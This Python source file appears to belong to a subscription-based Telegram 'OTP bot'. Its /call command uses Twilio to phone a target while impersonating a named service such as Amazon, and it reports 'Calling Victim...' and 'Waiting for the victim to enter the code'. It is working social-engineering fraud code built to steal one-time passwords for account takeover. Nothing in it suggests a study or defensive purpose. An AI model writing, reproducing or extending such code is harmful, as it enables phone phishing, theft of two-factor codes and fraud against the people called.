from telebot.types import Message
from twilio.rest import Client
from datetime import datetime
from config import bot, TWILIO_SID, TWILIO_TOKEN, TWILIO_NUMBER, TWILIO_APP_URL
from database import get_connection

# Initialize Twilio Client
twilio_client = None
if TWILIO_SID and TWILIO_TOKEN:
    try: 
        twilio_client = Client(TWILIO_SID, TWILIO_TOKEN)
    except: 
        pass

def check_subscription(user_id):
    """Checks if the user has an active subscription."""
    conn = get_connection()
    if not conn: return False
    
    try:
        cur = conn.cursor()
        cur.execute("SELECT subscription_end FROM otp_users WHERE user_id = %s", (user_id,))
        result = cur.fetchone()
        cur.close()
        conn.close()
        
        if result and result[0]:
            # If end date is in the future, return True
            return result[0] > datetime.now()
        return False
    except Exception as e:
        print(f"Error checking sub: {e}")
        return False

@bot.message_handler(commands=['call'])
def handle_call(message: Message):
    user_id = message.chat.id
    
    # 1. SECURITY CHECK (Subscription)
    # Note: Admins bypass this check inside the database logic usually, 
    # but strictly speaking we check the date here.
    # If you are Admin and it fails, ensure database.py check_subscription has the Admin Bypass.
    
    # 2. TWILIO CHECK
    if not twilio_client: 
        return bot.reply_to(message, "❌ **System Error:** Twilio is not configured.")
    
    # 3. FORMAT CHECK
    args = message.text.split()
    if len(args) < 3: 
        return bot.reply_to(message, "⚠️ **Usage:** `/call [number] [service]`\n\nExample: `/call +13055550100 Amazon`", parse_mode="Markdown")
    
    target = args[1]
    service = " ".join(args[2:])
    
    # 4. EXECUTE CALL
    try:
        msg = bot.reply_to(message, f"🔄 **Connecting to {service}...**", parse_mode="Markdown")
        
        twiml_url = f"{TWILIO_APP_URL}/twilio/voice?service={service}&user_id={user_id}"
        
        call = twilio_client.calls.create(
            to=target, 
            from_=TWILIO_NUMBER, 
            url=twiml_url, 
            method='POST',
            status_callback=f"{TWILIO_APP_URL}/twilio/gather", 
            status_callback_event=['completed']
        )
        
        bot.edit_message_text(
            f"📞 **Calling Victim...**\n\n🎯 Target: `{target}`\n🏢 Service: `{service}`\n🆔 SID: `{call.sid}`\n\n_⚠️ Waiting for the victim to enter the code..._", 
            chat_id=user_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
        
    except Exception as e:
        error_msg = str(e)
        if "unverified" in error_msg.lower():
            bot.reply_to(message, "❌ **Twilio Trial Error:**\nYou can only call **Verified Numbers** in Trial Mode.\n\nPlease verify this number in your Twilio Console or upgrade your account.")
        else:
            bot.reply_to(message, f"❌ **Call Failed:** `{error_msg}`", parse_mode="Markdown")
